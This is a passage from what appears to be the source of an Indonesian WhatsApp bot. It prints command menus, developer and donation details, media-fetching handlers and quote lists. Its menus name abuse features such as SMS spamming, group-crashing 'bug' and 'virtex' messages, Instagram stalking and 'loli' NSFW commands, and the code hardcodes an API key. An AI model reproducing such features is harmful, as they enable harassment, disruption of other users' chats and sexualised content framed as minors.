「 𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨 」  
□ ${prefix}ᴍᴇɴᴜɢʀᴏᴜᴘ
□ ${prefix}ᴍᴇɴᴜᴅᴏᴡɴʟᴏᴀᴅ
□ ${prefix}ᴍᴇɴᴜsᴏᴜɴᴅ
□ ${prefix}ᴍᴇɴᴜɪᴍᴀɢᴇ
□ ${prefix}ᴍᴇɴᴜᴀɴᴛɪᴠɪʀᴜs
□ ${prefix}ᴍᴇɴᴜᴏᴡɴᴇʀ
□ ${prefix}ᴍᴇɴᴜɴᴇᴡs
□ ${prefix}ᴍᴇɴᴜᴍᴀᴋᴇʀ
□ ${prefix}ᴍᴇɴᴜɴulis 

═════〘 ALPHABOT 〙═════`
                 aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: eme})
                 break
                 case 'sistemgrup':
                 if (!isRegistered) return reply(aml.noregis)
				 if (isBanned) return reply(aml.baned)
				reply('「 *WAIT PROSES !!* 」 ')
		      wew = fs.readFileSync(`./aldiganz/R.jpg`)
				eme = `
〇 ᴀɴᴛɪʟɪɴᴋ : ${sistem1}
〇 ɴsғᴡ : ${sistem6}
〇 ᴡᴇʟᴄᴏᴍᴇ : ${sistem3}
〇 ʟᴇᴠᴇʟɪɴɢ : ${sistem4}
〇 ʀɪɢɪᴇsᴛᴇʀ : ${sistem100}`
              aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: eme})
              break
            case 'infodeveloper':
            //JANGAN DI GANTI YA BREE GW SUSAH NYUSUN :)
            if (!isRegistered) return reply(aml.noregis)
		    if (isBanned) return reply(aml.baned)
		    wew = fs.readFileSync(`./aldiganz/R.jpg`)
            eme = `
╔══✪〘 DEVELOPER 〙
╠〇 ɴᴀᴍᴀ : Farhan
╠〇 ᴡᴀ : wa.me/6282351465415
╠〇 ɢʀᴏᴜᴘ ʙᴏᴛ : https://chat.whatsapp.com/E1bzBbKt9Bm7Gayuqtp1BP 
╚═════════════════✿`
              aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: eme})
              break
              case 'infobot':
            //JANGAN DI GANTI YA BREE GW SUSAH NYUSUN :)
            if (!isRegistered) return reply(aml.noregis)
		    if (isBanned) return reply(aml.baned)
		    wew = fs.readFileSync(`./aldiganz/R.jpg`)
            eme = `
╔══✪〘 INFO BOT 〙
╠〇 ɴᴀᴍᴀʙᴏᴛ : ALPHABOT
╠〇 ʙᴀᴛᴇʀᴀɪ : ${baterai.baterai}
╠〇 ᴍᴇʀᴋ ʜᴘ : SAMSUNG
╠〇 ᴘʀᴇғɪx : ${prefix}
╠〇 sᴇʀᴠᴇʀ : ${aldi.browserDescription[0]}
╠〇 ᴜsᴇʀʀɪɢɪᴇsᴛᴇʀ : ${_registered.length}
╚═════════════════✿`
             aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: eme})
             break
             case 'menusound':
             if (!isRegistered) return reply(aml.noregis)
		     if (isBanned) return reply(aml.baned)
		    wew = fs.readFileSync(`./aldiganz/R.jpg`)
            eme = `
╔══✪〘  ALPHABOT 〙 
╠〇 ${prefix}sound1
╠〇 ${prefix}sound2 
╠〇 ${prefix}sound3
╠〇 ${prefix}sound4
╠〇 ${prefix}sound5
╠〇 ${prefix}sound6
╠〇 ${prefix}sound7
╠〇 ${prefix}sound8
╠〇 ${prefix}sound9
╠〇 ${prefix}sound10
╠〇 ${prefix}sound11
╠〇 ${prefix}sound12
╠〇 ${prefix}sound13
╠〇 ${prefix}sound14
╠〇 ${prefix}sound15
╠〇 ${prefix}sound16
╠〇 ${prefix}sound17
╠〇 ${prefix}sound18
╠〇 ${prefix}sound19
╠〇 ${prefix}sound20
╠〇 ${prefix}sound21
╠〇 ${prefix}sound22
╠〇 ${prefix}sound23
╠〇 ${prefix}sound24
╠〇 ${prefix}sound25
╠〇 ${prefix}sound26
╠〇 ${prefix}sound27
╠〇 ${prefix}sound28
╠〇 ${prefix}sound29
╠〇 ${prefix}sound30
╠〇 ${prefix}sound31
╠〇 ${prefix}sound32
╠〇 ${prefix}sound33
╠〇 ${prefix}sound34
╠〇 ${prefix}sound35
╚═════════════════✿`
             aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: eme})
             break
        case 'menunsfw':
                 if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
				//wew = fs.readFileSync(`./aldiganz/R.jpg`)
               hai =`
┌▢「 ALPHABOT 」 
▢ ${prefix}hentai
▢ ${prefix}pokemon
▢ ${prefix}anjing
▢ ${prefix}nsfwloli
▢ ${prefix}nsfwneko
▢ ${prefix}solo
▢ ${prefix}nsfwtrap
▢ ${prefix}nsfwpussy
▢ ${prefix}nsfwyuri
▢ ${prefix}ero
▢ ${prefix}nsfwloli2
▢ ${prefix}sideoppai
▢ ${prefix}nsfwwaifu
▢ ${prefix}ecchi
▢ ${prefix}neko
▢ ${prefix}nekopoi <judul>
▢ ${prefix}hentai4everyone
▢ ${prefix}biganimetiddies
▢ ${prefix}animebellybutton
▢ ${prefix}lewdanimegirls
▢ ${prefix}hentaifemdom
▢ ${prefix}animearmpits
▢ ${prefix}hentaiparadise
▢ ${prefix}animethighss
▢ ${prefix}animebooty
▢ ${prefix}animefeets
▢ ${prefix}sideoppai
▢ ${prefix}hololewd
▢ ${prefix}ahegao
▢ ${prefix}yaoi
▢ ${prefix}trap
▢ ${prefix}chiisaihentai
▢ ${prefix}loli
▢ ${prefix}waifu
▢ ${prefix}neko
▢ ${prefix}hentai2
▢ ${prefix}waifu2
▢ ${prefix}randomhentong
▢ ${prefix}feetg
▢ ${prefix}solog
▢ ${prefix}kuni
▢ ${prefix}anal
▢ ${prefix}cum
▢ ${prefix}classic
▢ ${prefix}bj
▢ ${prefix}erokemo
└▢ 「 ALPHABOT 」 `
               await reply(hai, MessageType.text, tescuk, `${ucapanFakereply}`)
              break
      case 'menuowner':
                 if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
               teks =`
┌▢「 ALPHABOT 」 
▢ ${prefix}bc
▢ ${prefix}bcgc
▢ ${prefix}kickall
▢ ${prefix}setreply
▢ ${prefix}addlimit
▢ ${prefix}setlimit
▢ ${prefix}setnamabot
▢ ${prefix}setprefix
▢ ${prefix}setvhtear
▢ ${prefix}setonlydev
▢ ${prefix}setlolhuman
▢ ${prefix}antilinkgrup [1/0]
▢ ${prefix}antidelete [1/0]
▢ ${prefix}clearall
▢ ${prefix}ban
▢ ${prefix}unban
▢ ${prefix}block
▢ ${prefix}unblock
▢ ${prefix}setmemberlimit
▢ ${prefix}addbadword <teks>
▢ ${prefix}listbadword
▢ ${prefix}nobadword
▢ ${prefix}listblock
▢ ${prefix}leave
▢ ${prefix}event [1/0]
▢ ${prefix}clone
▢ ${prefix}setbotpp
▢ ${prefix}buggc
▢ ${prefix}eval
└▢ 「 ALPHABOT 」 `
               await reply(teks, MessageType.text, tescuk, `${ucapanFakereply}`)
              break
             case 'menugroup':
             if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
				wew = fs.readFileSync(`./aldiganz/R.jpg`)
               ou =`
┌▢「 ALPHABOT 」 
▢ ${prefix}hidetag
▢ ${prefix}del
▢ ${prefix}grouplist
▢ ${prefix}level
▢ ${prefix}leaderboard
▢ ${prefix}linkgc
▢ ${prefix}tagall
▢ ${prefix}setpp
▢ ${prefix}tambah [reply]
▢ ${prefix}add [62xxxx]
▢ ${prefix}kick [reply]
▢ ${prefix}setname
▢ ${prefix}wame
▢ ${prefix}setdesc
▢ ${prefix}demote [@tag]
▢ ${prefix}promote [@tag]
▢ ${prefix}listadmin
▢ ${prefix}group [buka/tutup]
▢ ${prefix}leveling [enable/disable]
▢ ${prefix}nsfw [enable/disable]
▢ ${prefix}simih [enable/disable]
▢ ${prefix}antilinkgrup [enable/disable]
▢ ${prefix}welcome [enable/disable]
└▢ 「 ALPHABOT 」 `
     aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: ou})
            break
             case 'menumaker':
                  if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
				//wew = fs.readFileSync(`./aldiganz/R.jpg`)
               bo =`
┌▢「 ALPHABOT 」 
▢ ${prefix}︎shadow
▢ ${prefix}cup
▢ ${prefix}cup1
▢ ${prefix}googlesearch
▢ ${prefix}avenger [text|text]
▢ ${prefix}smoke
▢ ${prefix}burnpaper
▢ ${prefix}lovemessage
▢ ${prefix}undergrass
▢ ${prefix}valorantbanner
▢ ${prefix}fflogo
▢ ${prefix}pemainbola
▢ ${prefix}newyearcard
▢ ${prefix}bannerlol
▢ ${prefix}captainamerica
▢ ${prefix}itxt
▢ ${prefix}starnight
▢ ${prefix}greenneon
▢ ${prefix}metallogo 
└▢ 「 ALPHABOT 」 `
               await reply(bo, MessageType.text, tescuk, `${ucapanFakereply}`)
               break
           case 'menunulis':
            if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
				wew = fs.readFileSync(`./aldiganz/R.jpg`)
               bo =`
       ${tampilUcapan}
┌▢「 ALPHABOT 」                      
▢ ${prefix}nulis
▢ ${prefix}nulis2
▢ ${prefix}nulis3
▢ ${prefix}nulis4
▢ ${prefix}nulis5
▢ ${prefix}magernulis [nama & kelas & nulis]
└▢ 「 ALPHABOT 」 `
               aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: bo})
               break
       case 'menudownload':
                if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
				//wew = fs.readFileSync(`./aldiganz/R.jpg`)
               bo =`
┌▢「 ALPHABOT 」                
▢ ${prefix}fbdl
▢ ${prefix}igvideo        
▢ ${prefix}igphoto 
▢ ${prefix}jooxplay [search]       
▢ ${prefix}igdl [video]
▢ ${prefix}zippyshare      
▢ ${prefix}spotify [Link]             
▢ ${prefix}tiktok [link]          
▢ ${prefix}play [query]  get audio       
▢ ${prefix}play2 [query]  get video 
▢ ${prefix}joox [search]        
▢ ${prefix}ytdl [link]
▢ ${prefix}ytmp42 get video
▢ ${prefix}play [search] get audio   
└▢ 「 ALPHABOT 」 `
               await reply(bo, MessageType.text, tescuk, `${ucapanFakereply}`)
               break  
          case 'menunews':  
                    if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
				wew = fs.readFileSync(`./aldiganz/R.jpg`)
               bo =`
┌▢「 ALPHABOT 」                
▢ ${prefix}cnnindonesia
▢ ${prefix}cnnnasional
▢ ${prefix}jadwaltv
▢ ${prefix}jadwaltvnow
▢ ${prefix}newsinfo
▢ ${prefix}cnninternasional
▢ ${prefix}infogempa
▢ ${prefix}liputan6
▢ ${prefix}cnnnews
▢ ${prefix}republika
▢ ${prefix}temponews
▢ ${prefix}kumparannews
▢ ${prefix}lazymedia
▢ ${prefix}resepmakanan
▢ ${prefix}xnxx
▢ ${prefix}xnxxsearch
▢ ${prefix}xhamster
▢ ${prefix}lirik
▢ ${prefix}ssweb
▢ ${prefix}map
▢ ${prefix}stalkig
▢ ${prefix}tts [kode bahasa]
▢ ${prefix}pixiv
▢ ${prefix}pixivdl
└▢ 「 ALPHABOT 」 `
               aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: bo})
               break  
               case 'menufun':
               if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
				wew = fs.readFileSync(`./aldiganz/R.jpg`)
               bo =`
┌▢「 ALPHABOT 」               
▢ ${prefix}beban
▢ ${prefix}cantik
▢ ${prefix}memburu
▢ ${prefix}mining
▢ ${prefix}marah
▢ ${prefix}tampar
▢ ${prefix}bisakah
▢ ${prefix}kapankah
▢ ${prefix}apakah
▢ ${prefix}seberapagay
▢ ${prefix}rate
▢ ${prefix}truth
▢ ${prefix}dare
▢ ${prefix}hobby
▢ ${prefix}beban
▢ ${prefix}ganteng
▢ ${prefix}cantik
▢ ${prefix}memeindo
▢ ${prefix}darkjoke
▢ ${prefix}cerpen
▢ ${prefix}quotesimage
▢ ${prefix}fitnah
▢ ${prefix}pasangan
▢ ${prefix}ntahlah
▢ ${prefix}quotesmotivasi
▢ ${prefix}quotessehat
▢ ${prefix}quotescinta
▢ ${prefix}hemkel
▢ ${prefix}quotes2
▢ ${prefix}katadoi
▢ ${prefix}katakataaldian
▢ ${prefix}qoutes
▢ ${prefix}caklontong
▢ ${prefix}tebaklirik
▢ ${prefix}tebakkimia
▢ ${prefix}suit
▢ ${prefix}slot
▢ ${prefix}xox
▢ ${prefix}family100
▢ ${prefix}tebakgambar
▢ ${prefix}kbbi
▢ ${prefix}dadu
▢ ${prefix}artinama
└▢ 「 ALPHABOT 」 `
               aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: bo})
               break        
               case 'menumedia':
                 if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
				reply('_menampilkan menumedia bot by ALDII Gz   _         LOADING...')
				//wew = fs.readFileSync(`./aldiganz/R.jpg`)
               bo =`
┌▢「 ALPHABOT 」       
▢ ${prefix}spamsms
▢ ${prefix}storywa [query]
▢ ${prefix}nickff
▢ ${prefix}ceritahoror
▢ ${prefix}ceritapendek
▢ ${prefix}quotes
▢ ${prefix}cersex
▢ ${prefix}quotesdilan
▢ ${prefix}quotesanime
▢ ${prefix}faktaunik
▢ ${prefix}ik21
└▢ 「 ALPHABOT 」 `
               await reply(bo, MessageType.text, tescuk, `${ucapanFakereply}`)
               break     
                case 'menuanime':   
                if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
				wew = fs.readFileSync(`./aldiganz/R.jpg`)
               bo =`
┌▢「 ALPHABOT 」       
▢ ${prefix}dewabatch
▢ ${prefix}kusonime <anime>
▢ ${prefix}randomnekonime
▢ ${prefix}randomanime
▢ ${prefix}randomwaifu
▢ ${prefix}animesaran
▢ ${prefix}animesaran2
▢ ${prefix}storyanime
▢ ${prefix}wait
▢ ${prefix}fuutarou  
▢ ${prefix}itsuki  
▢ ${prefix}nino        
└▢ 「 ALPHABOT 」 `
               aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: bo})
               break      
               case 'menuplastik':  
               case 'menuvirtex':
               case 'menuantivirus':
               if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
               wew = fs.readFileSync(`./aldiganz/R.jpg`)
                    data = `
  ◪ HALLO👋  ${pushname}
│
└❏ HARI *${tampilHari}*
┌────────────────▢
├❉  「 BY ${namabot} 」               
├𖠌 ${prefix}antialakazam
├𖠌 ${prefix}antivirustebel
├𖠌 ${prefix}antixvirus
├𖠌 ${prefix}anticollosal
├𖠌 ${prefix}antivirtex
├𖠌 ${prefix}antiviruschina
└────────────────▢`
          aldi.sendMessage(from, wew, image, {quoted: ftoko, caption : data,contextInfo: { forwardingScore: 508, isForwarded: true}})
          break
         case 'menusticker':
         if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
				wew = fs.readFileSync(`./aldiganz/R.jpg`)
                    data = `
┌▢「 ALPHABOT 」       
▢ ${prefix}sticker
▢ ${prefix}gifsticker
▢ ${prefix}attp
▢ ${prefix}ttp
▢ ${prefix}ttp2
▢ ${prefix}ttp3
▢ ${prefix}ttp4
▢ ${prefix}amongus
▢ ${prefix}takestick
▢ ${prefix}colong
▢ ${prefix}stickerwm [erro]
▢ ${prefix}stikerwm LU|WAHYU?
▢ ${prefix}spatrick
▢ ${prefix}stickerwa [query]
▢ ${prefix}telesticker [link]
▢ ${prefix}toimg
└▢ 「 ALPHABOT 」 `
        aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: data})
          break          
          case 'menuimage':
          if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
           //    wew = fs.readFileSync(`./aldiganz/R.jpg`)
                    data = `
┌▢「 ALPHABOT 」       
▢ ${prefix}triggered
▢ ${prefix}fisheye
▢ ${prefix}skullmask
▢ ${prefix}alien
▢ ${prefix}tosmile
▢ ${prefix}cartoon
▢ ${prefix}invert
▢ ${prefix}pixelate
▢ ${prefix}flip
▢ ${prefix}grayscale
▢ ${prefix}roundimage
▢ ${prefix}pencil
▢ ${prefix}wasted
└▢ 「 ALPHABOT 」 `
          await reply(data, MessageType.text, tescuk, `${ucapanFakereply}`)
          break
              case 'menuasupan':
                if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply(aml.baned)
				wew = fs.readFileSync(`./aldiganz/R.jpg`)
                    data = `
┌▢「 ALPHABOT 」       
▢ ${prefix}asupan3         
▢ ${prefix}asupan
▢ ${prefix}asupanspcl
▢ ${prefix}asupan1
▢ ${prefix}asupanwibu
▢ ${prefix}asupansantuy
▢ ${prefix}asupanbocil
▢ ${prefix}asupanukhty
▢ ${prefix}asupanghea
▢ ${prefix}asupan+62
▢ ${prefix}asupanrikagusriani
└▢ 「 ALPHABOT 」 `
       aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: data})
          break
				case 'donasi':
				case 'donate':
				   if (!isRegistered) return reply(aml.noregis)
		           if (isBanned) return reply(aml.baned)
					yo = fs.readFileSync(`./aldiganz/logo.jpg`)
			payment=`
┏━━━━━━━━━━━━━━━━━━━━
┃          DONASI BRO?  
┣━━━━━━━━━━━━━━━━━━━━
┣━⊱❉ DONASI YOK ❉⊰━━✿
┃   
┣━⊱ OVO
┣⊱ 082351465415
┣━⊱ GOPAY
┣⊱ 082351465415
┣━⊱ PULSA
┣⊱ 082351465415
┣━⊱ Dana
┣⊱ 082351465415
┣━⊱ Shooeepay
┣⊱ 082351465415
┣━⊱ Linkaja
┣⊱ 082351465415
┃
┗━━━━━━━━━━━━━━━━━━━━`
                 aldi.sendMessage(from, yo, image, {quoted: ftoko, caption : payment,contextInfo: { forwardingScore: 508, isForwarded: true}})
					break
case 'storywa':
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend)
				if (!isGroup) return reply(aml.groupo)
                reply(aml.wait)
                query = args.join('  ')
                paptitid = await fetchJson(`https://api.xteam.xyz/search/storywa?q=${query}&APIKEY=${xteam}`)
                kontolmuu = await getBuffer(paptitid.result)
                aldi.sendMessage(from, kontolmuu, video, {quoted: fkontak})
                await limitAdd(sender)
                break            
                case 'infogc':
				if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend)
				if (!isGroup) return reply(aml.groupo)
				aldi.updatePresence(from, Presence.composing)
					try {
					ppimg = await aldi.getProfilePicture(from)
				} catch {
					ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
				}
					let buf = await getBuffer(ppimg)
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `Nama grup : ${groupName}\nDeskripsi : ${groupDesc}\nJumlah Admin : ${groupAdmins.length}\nJumlah Member : ${groupMembers.length}`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}]`
					}
					aldi.sendMessage(from, buf, image, {quoted: fkontak, caption: teks})
					break
                case 'kontag':
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
				    if (!isGroup) return reply(aml.groupo)
                    if (args.length < 1) return reply(`cara : ${prefix + command} aldiFvnky|62xxxxxxxx`)
                    reply(aml.wait)
                    const pepek = body.slice(8)
                    const adan = pepek.split('|')[0]
                    const nuahh = pepek.split('|')[1]
                    const trot = 
                    'BEGIN:VCARD\n' +
                    'VERSION:3.0\n' +
                    'FN:' + adan + '\n' +
                    'ORG:Kontak\n' +
                    'TEL;type=CELL;type=VOICE;waid=' + nuahh + ':+' + nuahh + '\n' +
                    'END:VCARD'
                    let taih = await aldi.groupMetadata(from)
                    let setan = taih.participants
                    let bruy = []
                    for (let go of setan){
                    bruy.push(go.jid)
                    }
                    aldi.sendMessage(from, {displayname: adan, vcard: trot}, MessageType.contact, {contextInfo: {'mentionedJid': bruy}})
                    await limitAdd(sender)
                    break
				case 'asupanghea':
				if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend)
			    if (!isGroup) return reply(aml.groupo)
			    reply (aml.wait)
				dapgz = await fetchJson(`https://dapuhy-api.herokuapp.com/api/asupan/${command}?apikey=aldiFvnky`)
				pideo = await getBuffer(dapgz.result)
				aldi.sendMessage(from, pideo, video, {quoted: fkontak})
				await limitAdd(sender)
				break
              case 'asupan+62':
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend)
			    if (!isGroup) return reply(aml.groupo)
			    reply (aml.wait)
				dapgz = await fetchJson(`https://dapuhy-api.herokuapp.com/api/asupan/asupan?apikey=aldiFvnky`)
				pideo = await getBuffer(dapgz.result)
				aldi.sendMessage(from, pideo, video, {quoted: fkontak})
				await limitAdd(sender)
				break
		case 'quotesislami':
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
					if (!isGroup) return reply(aml.groupo)
					const islami =['Hal yang paling manis adalah ketika seseorang menyebutkan nama kamu di tahajjud mereka.','Ya Allah panggillah diriku dan orang tuaku ke baitullah dalam keadaan sehat walafiat.','Ya Allah semoga seseorang yang engkau jodohkan denganku adalah seseorang yang saat ini sedang aku perjuangkan.','Allah tidak pernah tidur. Semua pasti akan di balas kelak. Orang-orang jahat yang sekarang bisa tertawa karena banyak uang, berkuasa, tapi besok-besok mereka semua di balas seaaldi-aaldinya.','Jangan putus asa, Allah tidak akan mengecewakan hambanya yang ingin memperbaiki diri.','Percayalah orang yang menasehatimu untuk sholat adalah dia yang paling mencintaimu.','Bukannya Allah tidak tahu sedihmu, Tapi Allah tahu kalau kamu itu kuat.','Bacalah Al-Quran, Ia akan menenangkan hatimu meskipun engkau tidak memahami artinya.','Saat kita sakit hati sama omongan orang, saat itu juga sebenarnya Allah ngajarin kita buat jaga omongan kita ke orang lain. Sederhana bukan?','Di dunia ini orang paling baik pun bisa dicela, dan bahkan orang paling jahat sekalipun bisa di bela.','Al-Quran adalah teman yang tidak akan mengecewakan kamu di dunia dan akhirat.','Cara Allah menjawab doa hambanya : Iyaa.. aku beri untukmu sekarang. Tunggu, aku ingin mekihat dulu perjuanganmu. Tidak, aku punya yang lebih baik untukmu.','Dan Allah tidak akan mengadzab mereka selama mereka mau Memohon ampun kepada-Nya. [Al-Anfaal, 8:33]','Kesabaran itu ada dua macam : Sabar atas sesuatu yang tidak kamu ingin. Sabar menahan diri dari sesuatu yang kamu ingini. -Ali bin Abi Thalib','Ambillah kebenaran, jika kamu telah mendengarnya. Karena sungguh di atas kebenaran ada cahaya. (HR. Abu Daud)','Sholatlah agar hatimu tenang, Istighfarlah agar kecewamu hilang, Berdoalah agar bahagiamu segera datang.','Surga itu mahal.. Akan tetapi orang miskin tetap mampu membelinya, Karena harganya bukan pada Harta mekainkan Taqwa.','Ya Allah... Perbaikilah lisanku, Perbaikilah hatiku, Perbaikilah akhlakku, Perbaikilah hidupku, Aamiin..','Semoga hari ini Allah memudahkan setiap urusan kita, mekapangkan hati kita serta meringankan langkah kita, dalam kebaikan kita Aamiin.','Peganglah aku, bacalah aku setiap hari, karena aku akan menjadi penerang didalam kuburmu nanti. #Al-Quran','Kematian..Kamu terlalu banyak bercanda. Hingga sampai kamu lupa, kematian mungkin tidak menunggumu selesai tertawa.','Jangan khawatirkan rizkimu, karena Allah telah menjaminnya untukmu, namun khawatirkanlah amalanmu, karena Allah tidak menjamin surga-Nya untukmu..','Wahai orang-orang yang beriman! Ingatlah kepada Allah, Dengan mengingat (nama-Nya) sebanyak-banyaknya dan bertasbihlah kepada-nya pada waktu pagi dan petang.','Aku sangat ingin menjadi pemburu surga. Namun aku lupa bahwa aku juga buronan neraka.','Karena aku percaya apapun yang menjadi milikku akan tetap menjadi milikku. Sejauh apapun dia (menkontol) pergi. Sejauh apapun usaha orang lain ingin merebutnya dariku. Aku hanya perlu percaya pada Allah bahwa yang menjadi milikku tidak akan pernah menjadi milik orang lain.','Andai hidayah itu seperti buah yang bisa kubeli, maka akan kubeli berkeranjang-keranjang untuk aku bagikan kepada orang-orang yang aku cintai.','Bila kamu tidak mekihatku di syurga. Tolong tanya kepada Allah dimana aku, Tolonglah aku ketika itu..','Hanya Allah yang mengerti bagaimana sulitnya menahan sabar tanpa harus bercerita panjang lebar.','Letakkan hpmu lalu ambil air wudhu, shalatlah kamu, Allah menunggu curhatan darimu.','Maafin aku Ya Allah Gara gara aku mencintai dia tapi tidak pasti, sampai aku lupa mencintai mu juga.','Akan ada saatnya setelah salam dari sholatku, tanganmu yang pertama kali kusentuh.','Mungkin maksud Tuhan mempertemukan kamu dengannya adalah, sekedar mengingatkan bahwa tidak semua yang kamu inginkan bisa kamu dapatkan.','Percayalah Seorang wanita yang mencintai Allah. Allah akan berikan lelaki terbaik untuk menjaganya.','Berterimakasihlah kepada tuhan, Yang memberimu hidup dan kehidupan.','Mungkin kamu hanya harus sedikit peka untuk menyadari petunjuk dari Tuhan atas doa-doamu.']
					const isl = islami[Math.floor(Math.random() *   islami.length)]
					islam = await getBuffer(`https://i.ibb.co/akiranjvD3/IMG-20210127-WA0018.jpg`)
					aldi.sendMessage(from, islam, image, { quoted: fkontak, caption: 'Quotes Islami\n\n'+ isl, contextInfo: { forwardingScore: 508, isForwarded: true}})
					await limitAdd(sender)
					break	
		case 'quotesnasehat':
                   if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
					if (!isGroup) return reply(aml.groupo)
					const nasehat =['Jangan pernah mengabaikan apapun yang terjadi, suatu saat akan sadar dan menyesal, ingat tuhan akan selalu memberikan penyesalan terakhir ...','Ingat iya.. Perilaku mu bisa mengubah perasaan seseorang.','Setia itu bukan yang selalu ada, namun saat tak bersama dia tahu hatinya milik siapa.','Kamu perlu belajar satu hal : "Menghargai seriusnya seseorang."','Jangan cari yang sempurna, Sempurnakan saja yang ada.','Ketika seseorang menghina kamu, itu adalah sebuah pujian bahwa selama ini mereka menghabiskan banyak waktu untuk memikirkan kamu, bahkan ketika kamu tidak memikirkan mereka.','Yang terbaik tidak akan hilang. Jika dia hilang maka dia bukanlah yang terbaik.','Percayalah. Suatu hari nanti pasti akan ada seseorang yang bangga memilikimu.','Tidak ada karya yang pernah dibuat oleh seorang seniman yang malas.','Jika seseorang memberimu perhatian jangan pernah mengabaikannya karena suatu saat perhatian sekecil itu kamu rindukan saat kamu kesepian.','Bersyukurlah.. Untuk segala apapun yang engkau miliki saat ini, sebab nikmat itu akan bertambah ketika kamu dapat mensyukuri apa yang telah diberi saat ini. #Buat diri ini jangan banyak mengeluh yah.','Ada perbedaan antara menyerah dan tau kapan kamu merasa cukup dalam berusaha.','Jangan sampai kesenanganmu menyusahkan orang lain. Jangan pula kesusahanmu menyenangkan orang lain.','Semakin banyak kamu memberi, semakin banyak pula yang akan kembali padamu.','Jangan pernah bandingkan akhir kesuksesan orang lain dengan pertengahan prosesmu.','Lakukan apa yang kamu bisa, dengan apa kamu miliki, dimanapun kamu berada.','Hidup memang bukan balapan, tetapi kamu memang perlu untuk terus bergerak maju.','NIKMATI HIDUPMU, LUPAKAN UMURMU.','Sebaik-baiknya permintaan maaf adalah membaiknya tingkah laku.','Belajarlah memahami bahwa tidak semua keinginan bisa terpenuhi, barangkali itu adalah obat yang terbaik untuk mencegah kecewa dan sakit hati.','Kamu akan menemukan yang terbaik, ketika kamu sudah berhenti membanding-bandingkan.','Jangan menilai orang dari masa lalunya karena kita semua sudah tidak hidup disana. Semua orang bisa berubah, biarkan mereka membuktikannya.','Jika dia tidak merasakan kehadiranmu, buat dia merasakan kepergianmu.','Orang pintar mampu memecahkan masalah. Orang bijak mampu menghindarinya.','Bersikap tidak lagi peduli lebih baik dari pada balas dendam.','Tegas akan diri sendiri, buang pikiran negatif dan lakukan yang baik. Kegelisahan hanya milik mereka yang putus asa.','Jangan pikirkan kegagalan kemarin, hari ini sudah lain, sukses pasti diraih selama semangat masih menyengat.','Memaafkanmu bukan berarti memberimu kesempatan sekali lagi.','Berubah menjadi lebih baik adalah pilihan. Tapi, merasa paling baik adalah kesalahan.','Jangan pernah bandingkan dirimu dengan orang lain, tapi bandingkanlah dengan dirimu yang lalu, apakah hari ini sudah lebih baik?','Ketahuilah orang yang paling sering memberi nasihat kepadamu, itulah orang yang paling mencintai kamu.','Jangan pernah berhenti belajar, karena hidup tidak pernah berhenti mengajarkan.','Salah satu tanda dirimu tidak berakhlak adalah main HP ketika ada orang yang berbicara.','Raihlah kesuksesan yang tidak seseorangpun berfikir kamu bisa meraihnya. Buktikan pada mereka kalau kamu bisa!','Kesalahan adalah bukti nyata kalau kamu pernah menkontol. Jangan takut salah. Takutlah untuk mekakukan kesalahan-kesalahan yang sama dua kalinya.','Cepat atau lambat bukan masalah. Selama kamu tetap bergerak maju, tidak ada akhirnya kamu akan tetap sampai tidak ada tujuan.','Jika kamu tidak bisa membahagiakan orang lain, Setidaknya janganlah kamu tambah dukanya.','Teruslah berusaha sampai temanmu berkata kepadamu "Sombong iya sekarang."','Ketika kamu mekakukan sebuah kesalahan, Akuilah dan jangan ragu untuk meminta maaf. Tidak pernah ada satupun orang dalam sejarah yang mati tersedak karena menelan gengsinya sendiri.','Syukuri yang menyayangimu, Maafkan yang menyakitimu.','Tunjukkan keburukanmu, lalu lihat siapa yang bertahan.','Kamu boleh lelah, tetapi tidak boleh menyerah untuk selamanya.','Jangan pernah lupa bilang "Terima Kasih." Jangan pernah gengsi bilang "Maaf." Jangan pernah jadi terlalu sombong untuk bilang "Tolong."','Masa lalu 